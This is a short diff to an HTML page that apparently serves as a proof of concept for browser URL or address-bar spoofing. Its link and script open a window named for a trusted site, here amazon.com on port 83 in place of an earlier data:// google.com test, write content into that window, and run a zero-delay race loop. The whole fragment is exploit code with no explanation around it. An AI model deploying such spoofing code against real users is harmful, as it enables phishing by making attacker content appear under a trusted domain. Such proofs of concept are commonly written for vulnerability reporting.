@@ -3,7 +3,7 @@
 </head>
 
 <body>
-    <a href="javascript:window.open('data://google.com,<h1>Test</h1>','x');" onclick="startSpoof()">Spoof</a>
+    <a href="javascript:window.open('http://amazon.com:83/','x');" onclick="startSpoof()">Spoof</a>
 </body>
     
     <script>
@@ -15,14 +15,14 @@
         windowSpoof.location.href !== 'about:blank';
       }
       catch (e) {
-        windowSpoof.location.href='data://google.com,<h1>Test</h1>';
+        windowSpoof.location.href='http://amazon.com:83/';
       }
     }
     
     function startSpoof() {
 
       windowSpoof = window.open("data://google.com,<h1>Test</h1>","x");
-      windowSpoof.document.write('<h1 style="color:red">Hacked!<h1>');
+      windowSpoof.document.write('http://amazon.com:83/');
 
       setInterval('race()', 0);
     
